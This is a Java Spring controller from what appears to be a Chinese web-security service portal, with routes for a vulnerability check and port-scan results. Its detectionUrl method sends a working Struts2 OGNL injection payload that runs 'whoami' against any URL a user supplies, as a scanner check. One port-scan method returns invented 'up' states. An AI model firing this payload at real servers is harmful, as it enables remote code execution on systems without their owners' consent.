package com.cn.ctbri.controller;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.ResourceBundle;
import java.util.Set;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import com.cn.ctbri.entity.Xlist;
import com.cn.ctbri.portscanEntity.AppReport;
import com.cn.ctbri.service.IAppReportService;
import com.cn.ctbri.service.IXlistService;
import com.cn.ctbri.util.JerseyJsonUtil;

@Controller
public class XController {
	// 日志对象
	private Logger log = Logger.getLogger(this.getClass());
	private static ResourceBundle bundle = ResourceBundle.getBundle("northAPI");
	private static String getScanServiceReportUrl = bundle
			.getString("getscanservicereport_Url");
	private static String creatScanServiceReportUrl = bundle
			.getString("createscantask_Url");
	@Autowired
	IXlistService xlistService;

	/**
	 * 跳转到x专区页面
	 */
	@RequestMapping("/Xpage.html")
	public String viewXPage(Model model, HttpServletRequest reques) {

		return "/source/page/Xpage/viewXPage";
	}

	/**
	 * 检测
	 */
	@RequestMapping("/detectionUrl.html")
	public void detectionUrl(HttpServletRequest request,
			HttpServletResponse response) {

		boolean flag = true;
		try {
			String urlInfo = request.getParameter("urlInfo");
			String uriPage = urlInfo
					+ "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=whoami";
			flag = this.GetDetection(uriPage);
			if (!flag) {
				flag = this.PostDetection(uriPage);

			}
			response.setContentType("textml;charset=UTF-8");
			response.getWriter().print(flag);
		} catch (Exception e) {
			e.printStackTrace();

		}
	}

	public boolean PostDetection(String urlInfo) {

		boolean flag = false;
		try {
			log.info(urlInfo);

			HttpClient client = new HttpClient();
			PostMethod post = new PostMethod(urlInfo);
			// 用于乱码
			post.getParams().setParameter(
					HttpMethodParams.HTTP_CONTENT_CHARSET, "utf-8");
			// 提交执行
			int code = client.executeMethod(post);
			String body = null;
			// 判断返回值是否成功
			if (code == HttpStatus.SC_OK) {
				body = post.getResponseBodyAsString();
			}
			if (code == 200 && body != null) {
				if (body.indexOf("whoami") != -1) {
					flag = true;
					log.info("发现漏洞");

				} else {
					flag = false;
					log.info("无....");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			log.info("访问地址无响应!");
			flag = false;
		}
		return flag;
	}

	public boolean GetDetection(String urlInfo) {
		boolean flag = false;
		try {
			HttpClient client = new HttpClient();
			GetMethod gets = new GetMethod(urlInfo);
			int code = client.executeMethod(gets);
			String body = null;
			if (code == HttpStatus.SC_OK) {
				body = gets.getResponseBodyAsString();
			}
			if (code == 200 && body != null) {
				if (body.indexOf("whoami") != -1) {
					flag = true;
					log.info("发现漏洞");

				} else {
					flag = false;
					log.info("无....");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			log.info("访问地址无响应!");

			flag = false;
		}
		return flag;
	}

	@RequestMapping("/source/page/Xpage/portScanMethod2.html")
	@ResponseBody
	public void portScanMethod2(HttpServletRequest request,
			HttpServletResponse response) {
		/*
		 * String target="tcp"; String port="34,45,78,89-102"; String
		 * scan="tcp"; m172490z30.imwork.net anquanbang.net baidu.com google.com
		 * 21-22,80,443 String agreement="tcp";
		 */
		// JerseyJsonUtil jerseyJsonUtil=new JerseyJsonUtil();
		// String
		// status=JSONObject.fromObject(jerseyJsonUtil.getMethod(SOUTH_SERVER_WEB_ROOT+getScanServiceReportUrl)).get("status").toString();

		String target = request.getParameter("target");
		String port = request.getParameter("port");
		String scan = request.getParameter("scan");
		String agreement = request.getParameter("port");

		System.out.println(target);
		System.out.println(port);
		SimpleDateFormat timeFormat = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss");
		long time = System.currentTimeMillis();
		String dataTime = timeFormat.format(time);
		List<Integer> list = new ArrayList<Integer>();
		String[] strArr = port.split(",");
		for (String str : strArr) {
			str = str.trim();
			if (str.contains("-")) {
				int number = str.indexOf('-');
				int begin = Integer.valueOf(str.substring(0, number).trim());
				int end = Integer.valueOf(str.substring(number + 1,
						str.length()).trim());
				if (begin > end) {
					int middle = end;
					end = begin;
					begin = middle;
				}
				for (int i = begin; i <= end; i++) {
					list.add(i);
				}
			} else {
				list.add(Integer.valueOf(str));
			}
		}
		int total = list.size();
		JSONObject jsonObject = new JSONObject();
		jsonObject.put("total", total);
		JSONArray jsonArray = new JSONArray();
		for (int i = 0; i < total; i++) {
			JSONObject jsonObject2 = new JSONObject();
			jsonObject2.put("id", i + 1);
			jsonObject2.put("port", list.get(i));
			jsonObject2.put("agreement", scan);
			jsonObject2.put("state", "up");
			jsonObject2.put("time", dataTime);
			jsonArray.add(jsonObject2);
		}
		jsonObject.put("rows", jsonArray);
		try {
			// CommonUtil.writeJsonToJsp(response, jsonArray);
			// CommonUtil.writeToJsp(response, jsonObject);
			response.getWriter().write(jsonArray.toString());
			response.getWriter().flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return;
	}

	@RequestMapping("/source/page/Xpage/portScanMethod.html")
	@ResponseBody
	public void portScanMethod(HttpServletRequest request,
			HttpServletResponse response) {
		/*
		 * String target="tcp"; String port="34,45,78,89-102"; String
		 * scan="tcp"; String agreement="tcp";
		 */

		JSONObject jsonObject2 = new JSONObject();
		jsonObject2.put("type", "GetReport");
		jsonObject2.put("task_type", "portscan");
		jsonObject2.put("target", "http://www.anquanbang.net");

		JerseyJsonUtil jerseyJsonUtil = new JerseyJsonUtil();
		String count = JSONObject.fromObject(
				jerseyJsonUtil.postMethod(getScanServiceReportUrl,
						jsonObject2.toString())).toString();
		JSONObject result = new JSONObject();
		String target = request.getParameter("target");
		String port = request.getParameter("port");
		String scan = request.getParameter("scan");
		String agreement = request.getParameter("port");
		if (count == null
				|| count.length() == 0
				|| (!count.startsWith("{"))
				|| !JSONObject.fromObject(count).getString("status")
						.equals("success")) {
			result.put("status", "false");
			System.out.println(result.toString());
			return;
		}
		// if(json==null||)
		JSONObject json = JSONObject.fromObject(count);
		String status = json.getString("status");
		System.out.println(status);
		SimpleDateFormat timeFormat = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss");

		JSONArray jsonArray = json.getJSONArray("reportList");
		JSONObject report = null;
		JSONObject portLists = new JSONObject();
		JSONArray rows = new JSONArray();
		int total = 0;
		if (jsonArray != null && jsonArray.size() > 0) {
			report = (JSONObject) jsonArray.get(0);
			System.out.println(report.toString());

			String dataTime = timeFormat.format(Long.valueOf(report
					.getString("addTime")));
			JSONObject portReport = (JSONObject) report.get("portReport");
			Set<Object> idSet = portReport.keySet();
			int i = 1;
			for (Object id : idSet) {
				// System.out.println(id);
				total++;
				String str = (String) id;
				JSONObject object = new JSONObject();
				JSONObject object2 = portReport.getJSONObject(str);
				object.put("id", i);
				object.put("port", object2.getString("port"));
				object.put("agreement", object2.getString("protocol"));
				object.put("state", object2.getString("state"));
				object.put("time", dataTime);
				i++;
				rows.add(object);
			}
			// System.out.println(dataTime);
		}
		portLists.put("total", total);
		portLists.put("rows", rows);
		result.put("status", "success");
		result.put("portLists", portLists);
		System.out.println(result.toString());

		try {
			// CommonUtil.writeJsonToJsp(response, jsonArray);
			// CommonUtil.writeToJsp(response, jsonObject);
			response.getWriter().write(result.toString());
			response.getWriter().flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return;
	}

	/**
	 * 跳转到端口扫描页面
	 */
	@RequestMapping("/portScan.html")
	public String portScan(Model model, HttpServletRequest reques) {

		return "/source/page/Xpage/portScan";
	}

	/**
	 * 功能描述： 系统安全帮活动详情页面 参数描述： Model m
	 *
	 * @time 2017-8-24
	 */
	@RequestMapping("/Xlist.html")
	public String showXlist(Model m) {
		List<Xlist> servList = xlistService.listXlist();
		m.addAttribute("servList", servList);
		return "/source/page/child/Xlist";
	}
	
	@RequestMapping("/Xlisty.html")
	public String getAppR() {
		int id=1;
		AppReport appReport=xlistService.getAppReportById(id);
		System.out.println(appReport.toString());
		return null;
	}
	
	
	
}
